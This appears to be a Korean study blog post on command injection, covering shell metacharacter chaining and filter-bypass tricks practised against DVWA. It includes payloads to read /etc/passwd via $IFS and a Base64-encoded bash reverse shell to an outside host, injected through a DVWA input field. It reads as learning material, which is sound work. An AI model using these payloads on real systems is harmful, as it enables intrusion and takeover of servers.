---
layout: post
title: "명령어 인젝션 (Command Injection) 공부"
date: 2025-09-22 17:00:00 +0900
categories: [웹 해킹]
---

### 1. 개요

명령어 인젝션은 사용자의 입력값이 서버의 쉘 명령어의 일부로 검증 없이 전달될 때 발생하는 취약점이다. 공격자는 쉘의 특수문자(Metacharacters)를 주입하여 원래의 명령어를 종료시키거나 변조하고 자신이 원하는 새로운 명령어를 실행시킬 수 있다.

이 공격은 [A01: 접근 통제 실패](https://hamap0.github.io/projects/owasp-top-10/2025/08/25/A01_Broken-Access-Control.html) 보고서에서 리버스 쉘을 획득하여 서버 제어권을 장악하는 데 결정적인 역할을 했다.

---

### 2. 주요 공격 기법

공격의 핵심은 쉘 메타 문자를 사용하여 명령어의 흐름을 제어하는 것이다.

*   **`;` (Semicolon):** 앞 명령어의 성공 여부와 관계없이 다음 명령어를 순차적으로 실행한다.
    ```
    ping 127.0.0.1; whoami
    ```
*   **`&&` (Ampersand):** 앞 명령어가 성공적으로 실행되었을 때만 다음 명령어를 실행한다.
    ```
    ping 127.0.0.1 && whoami
    ```
*   **`|` (Pipe):** 앞 명령어의 표준 출력(stdout)을 다음 명령어의 표준 입력(stdin)으로 전달한다.

---

### 3. 필터링 우회 기법

단순한 메타 문자 주입은 방어 로직에 의해 차단될 수 있다. 이때는 필터링 규칙을 우회하는 기법이 필요하다.

#### **공백 문자 필터링 우회**
일부 시스템은 명령어 사이의 공백 문자를 필터링한다. 이때는 공백 대신 쉘의 내부 필드 구분자(Internal Field Separator)인 `$IFS` 변수를 사용할 수 있다.
*   **기본:** `cat /etc/passwd`
*   **우회:** `cat$IFS/etc/passwd`

#### **키워드 필터링 우회 (Base64 인코딩)**
`cat` · `ls` · `nc` 등 특정 명령어 키워드가 필터링될 때 사용된다. 실행할 명령어를 Base64로 인코딩하여 필터링을 우회한 뒤 서버에서 디코딩하여 실행시킨다.
1.  **공격자 PC에서 페이로드 인코딩:**
    ```bash
    # 실행할 리버스 쉘 명령어를 Base64로 인코딩 (-w0 옵션은 줄바꿈 없이 한 줄로 출력)
    echo "bash -i >& /dev/tcp/192.9.200.12/4444 0>&1" | base64 -w0
    ```
2.  **대상 서버에서 디코딩 및 실행:**
    인코딩된 문자열을 `echo`로 출력하고 파이프(`|`)를 통해 `base64 -d`로 디코딩한 뒤 다시 파이프를 통해 `bash`로 실행시킨다.
    ```bash
    # DVWA 입력값:
    127.0.0.1; echo <Base64 Encoded String> | base64 -d | bash
    ```
   ![CommandinjectionBase64](/assets/images/Cinjection_1.png)

이 방식은 필터링이 복잡할수록 유용하며 `A01` 보고서에서 서버 제어권을 획득할 때 사용된 핵심 기법이다.

<hr class="short-rule">
